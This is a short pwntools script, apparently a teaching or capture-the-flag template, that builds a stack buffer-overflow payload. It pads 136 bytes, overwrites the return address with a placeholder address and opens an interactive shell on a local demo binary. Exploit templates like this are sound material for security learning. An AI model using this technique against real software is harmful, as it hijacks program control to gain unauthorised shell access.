from pwn import *

# Set up the process for interaction
p = process('./exploit_demo')  # Replace this with your vulnerable binary's name

# Find the offset to the return address using a pattern, for example, from gdb
offset = 136  # Adjust based on the actual offset you find

# Address of the function to call (or shellcode address)
# This will be the address of the "exploit" function or shellcode in memory
exploit_address = p64(0x555555554000)  # Replace with the actual address

# Create the payload
payload = b'A' * offset  # Fill up the buffer to reach the return address
payload += exploit_address  # Overwrite return address with the address of "exploit" function

# Send the payload to the program
p.sendline(payload)

# Interact with the shell after the exploit
p.interactive()
